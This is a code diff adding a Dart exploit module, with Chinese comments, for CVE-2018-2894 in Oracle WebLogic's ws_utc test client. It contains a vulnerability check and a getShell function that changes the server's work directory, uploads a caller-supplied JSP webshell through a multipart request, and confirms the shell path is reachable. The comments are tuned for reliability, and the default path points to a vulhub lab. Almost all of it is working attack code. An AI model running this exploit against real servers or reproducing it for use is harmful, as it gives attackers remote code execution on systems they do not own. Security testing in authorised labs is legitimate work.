@@ -341,4 +341,87 @@ class WebLogicExpService {
       return null;
     }
   }
+
+  // ── CVE-2018-2894 — Web Service 测试页文件上传 GetShell ──────────────────
+  // 影响：WebLogic 12.2.1.3（/ws_utc 测试客户端开启时）
+  // 流程：
+  //   1. POST /ws_utc/begin.do 修改 currentWorkDir 为 Web 可访问目录（css 子目录）
+  //   2. 多部分上传 JSP Webshell 到 /ws_utc/resources/setting/OPTIONS/<class>
+  //   3. Shell 路径 /ws_utc/css/{timestamp}.jsp
+  //
+  // Bug 预防：
+  //   1. timestamp 用毫秒级时间戳同时作为 setting-id 和文件名，保证唯一且可预测。
+  //   2. 上传后等待 300ms 再验证 Shell，避免服务器写入延迟导致 404 误判。
+  //   3. workDir 依赖安装路径，做成参数由用户传入；默认值为 vulhub 环境路径。
+  //   4. 检测只检查 /ws_utc/config.do 是否返回 200，不上传文件，安全无副作用。
+  static const _wsUtcDefaultWorkDir =
+      '/u01/oracle/user_projects/domains/base_domain/servers/AdminServer'
+      '/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls'
+      '/4mcj4y/war/css';
+
+  Future<ExpResult> checkCve20182894() async {
+    try {
+      final res = await http
+          .get(Uri.parse('$_base/ws_utc/config.do'))
+          .timeout(timeout);
+      if (res.statusCode == 200 &&
+          (res.body.contains('ws_utc') || res.body.contains('WebService'))) {
+        return ExpResult(
+          true,
+          'CVE-2018-2894',
+          'Web Service 测试客户端可访问 (HTTP ${res.statusCode})',
+        );
+      }
+      if (res.statusCode == 200) {
+        return ExpResult(
+          true,
+          'CVE-2018-2894',
+          '/ws_utc/config.do 可访问 (HTTP 200)，疑似存在漏洞',
+        );
+      }
+    } catch (_) {}
+    return const ExpResult(false, 'CVE-2018-2894', '');
+  }
+
+  Future<String?> getShellCve20182894(
+    String shellContent, {
+    String workDir = _wsUtcDefaultWorkDir,
+  }) async {
+    try {
+      // Step 1: 修改 Work Home Dir 为 Web 可访问 css 子目录
+      await http
+          .post(
+            Uri.parse('$_base/ws_utc/begin.do'),
+            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+            body: 'currentWorkDir=${Uri.encodeQueryComponent(workDir)}',
+          )
+          .timeout(timeout);
+
+      // Step 2: 上传 JSP Shell（多部分）
+      final timestamp = DateTime.now().millisecondsSinceEpoch;
+      final uploadUri = Uri.parse(
+        '$_base/ws_utc/resources/setting/OPTIONS/'
+        'com.bea.core.repackaged.springframework.context.support'
+        '.FileSystemXmlApplicationContext',
+      );
+      final req = http.MultipartRequest('POST', uploadUri)
+        ..fields['setting-id'] = timestamp.toString()
+        ..fields['wsdl-url']   = ''
+        ..files.add(http.MultipartFile.fromString(
+          'uploadedFile',
+          shellContent,
+          filename: '$timestamp.jsp',
+        ));
+      await req.send().timeout(timeout);
+
+      // Step 3: 等待写入后验证 Shell 路径
+      await Future<void>.delayed(const Duration(milliseconds: 300));
+      final shellUrl = '$_base/ws_utc/css/$timestamp.jsp';
+      final check = await http.get(Uri.parse(shellUrl)).timeout(timeout);
+      if (check.statusCode == 200) return shellUrl;
+      return null;
+    } catch (_) {
+      return null;
+    }
+  }
 }
